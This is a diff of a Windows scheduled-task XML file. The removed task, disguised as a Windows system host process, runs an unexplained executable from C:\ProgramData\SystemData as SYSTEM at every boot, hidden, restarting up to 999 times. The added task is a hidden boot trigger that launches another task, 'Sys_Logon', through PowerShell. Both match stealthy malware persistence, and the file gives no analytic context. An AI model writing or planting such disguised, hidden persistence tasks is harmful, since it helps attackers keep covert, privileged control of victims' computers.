@@ -1,40 +1,15 @@
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo>
-    <Date>2025-09-26T17:13:00</Date>
-    <Author>SYSTEM</Author>
-    <Description>System host process for Windows services (BootTrigger)</Description>
-  </RegistrationInfo>
-  <Triggers>
-    <BootTrigger>
-      <Enabled>true</Enabled>
-    </BootTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <UserId>SYSTEM</UserId>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <RestartOnFailure>
-      <Interval>PT1M</Interval>
-      <Count>999</Count>
-    </RestartOnFailure>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <Hidden>true</Hidden>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>C:\ProgramData\SystemData\gtav.exe</Command>
-      <WorkingDirectory>C:\ProgramData\SystemData</WorkingDirectory>
-    </Exec>
-  </Actions>
-</Task>
+<Triggers>
+  <BootTrigger>
+    <Enabled>true</Enabled>
+  </BootTrigger>
+</Triggers>
+<Settings>
+  <Hidden>true</Hidden>
+  <StartWhenAvailable>true</StartWhenAvailable>
+</Settings>
+<Actions>
+  <Exec>
+    <Command>powershell.exe</Command>
+    <Arguments>-Command "Start-ScheduledTask -TaskName 'Sys_Logon'"</Arguments>
+  </Exec>
+</Actions>
